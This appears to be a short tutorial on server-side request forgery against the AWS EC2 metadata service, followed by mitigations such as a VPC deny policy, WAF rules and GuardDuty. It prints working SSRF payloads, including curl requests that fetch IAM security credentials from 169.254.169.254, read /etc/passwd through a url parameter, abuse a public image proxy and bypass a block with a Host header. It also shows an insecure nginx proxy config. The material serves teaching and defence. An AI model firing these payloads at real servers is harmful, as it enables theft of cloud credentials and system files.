AWS EC2 has a feature called the Instance Metadata Service ([official documentation](
https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)).
This enables any EC2 instance to access a REST API running on 169.254.169.254, which returns data about the
instance itself. Some examples include the instance name, the instance image (AMI) ID, and a bunch of other
interesting things.

## AWS metadata

You can access aws metadata inside your ec2 (hypervisor)

```
ec2-user> curl -s http://169.254.169.254/latest/meta-data

# E.g.
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/SSRFDEMO-ISRM-WAF-Role
```

## Server Side Request Forgery (SSRF)

SSRF is a vulnerability which allows an attacker to make web requests from the context of the server
 host machine to arbitrary URL's.

This vulnerability can allow the attacker to access resources internal to the network, which would otherwise
be inaccessible.

E.g. Run a curl command from a server.

```
curl -vv "http://server/redirect?url=http://169.254.169.254/latest/meta-data/"

curl -vv "https://example.com/viewimage/?url=file:///etc/passwd"

PHP:
curl_exec($ch);

Proxy:
curl "https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data"

Proxy Config (nginx):
# Don't ever use setup a proxy like this!
server {
  listen 80 default_server;
  location / {
    proxy_pass http://$host;
  }
}
```

Example: see [test_ssrf.sh](test_ssrf.sh)


## Fix

```
1. Add a policy to the role to ensure all action must be from the vpc.

---
"Statement": [
  {
    "Action": "*",
    "Resource": "*",
    "Effect": "Deny",
    "Condition": {
      "StringNotEquals": {
        "aws:SourceVpc": [ "vpc-xxx-this-vpc" ]
      }
    }
  }
]

Cannot access s3 anymore.
But still can do -
`curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo`

2. Set up WAF
a) go to WAF > Web ACLs
b) create/edit Web ACL (e.g. SSRF_Protection)
   - Rules > Edit web ACL
     - Rule: SSRFProectionRule
     - Action: Block
c) Details
Now curl won't work anymore.

3. GuardDuty
Reported "UnauthorizedAccess:IAMUser ... has been used from external IP address..."

4. Cloudtrail filter
($.errorCode="Client.UnauthorizedOperation")

5. Patch your applications and OS
6. Never trust user inputL use input validation checks
7. Blacklist the AWS metadata url
8. Create different AWS accounts to limit the blast radius
9. Use IP reputation blacklisting and other WAF rules
```
